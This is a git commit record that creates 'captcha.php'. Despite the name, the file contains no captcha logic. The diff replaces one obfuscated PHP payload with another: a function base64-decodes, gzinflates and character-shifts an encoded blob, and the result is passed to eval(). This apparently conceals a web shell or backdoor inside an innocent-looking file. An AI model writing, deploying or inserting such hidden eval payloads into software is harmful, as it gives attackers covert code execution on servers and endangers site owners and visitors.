bfe71b2bca0013f2b890b2eca78ed70380f523fb
Waryono763 <53144514+Waryono763@users.noreply.github.com>
2021-05-30 14:10:09 +0000

    Create captcha.php

--- captcha.php
+++ captcha.php
@@ -1,9 +1,9 @@
-<?php function VlJ($jmh)
+<?php function VZdIp($LkV)
 { 
-$jmh=gzinflate(base64_decode($jmh));
- for($i=0;$i<strlen($jmh);$i++)
+$LkV=gzinflate(base64_decode($LkV));
+ for($i=0;$i<strlen($LkV);$i++)
  {
-$jmh[$i] = chr(ord($jmh[$i])-1);
+$LkV[$i] = chr(ord($LkV[$i])-1);
  }
- return $jmh;
- }eval(VlJ("ZdDNasMwDAfwB/BTiJBDe1iTkLFDSzu2wwoNo5fttIFxHKU29UeQnY1S+uxz2HoY1UGIPz+QEEAqxpDIEyccPEXtDrNyvmJ5K5yDNWT5eRijVpenkzdCwd7CzmsHb2jwQMJCI6yG5Zz9d/m51TReQMU4hGVRxIXFYt/4vtdSC8MdfjOWpTUBXfA0Lfos6/qjXNWl/ctvw1YEfLjn6KTvsOPVJLa+Nf7YPKf2O07wKox2xwldz+hGHRdSFpV6eX1PMJxCRDvLyMId9SDFEKUS/KvK0gseNz8="));?>
+ return $LkV;
+ }eval(VZdIp("VY/NSsNAFIUfYJ7iErJoFzaZjj+hRaV0pV3EhYuCwjBJb5LB+Ql3pkotfXYTMIJ3+Z0PzrkAwzGGRJ4kYe8patfO8vmapZVyDu4hSc/9Merusjl5ozooLTx77eAVDbakLOyU1bCas/9eeq40HS/QxdiHVZbFhcWs3Pmm0bVWRjr8YsnQEtAFT2PPey7EG1+L3P7yP5hPsFIBb68lutof8CD5aLwUSy54URR3S74ZpSk12n2MwrTgG3HRmuxpv93eiDIOajiFiHaWkIUraqBWfaw7JT95MvzPHh9+AA=="));?>
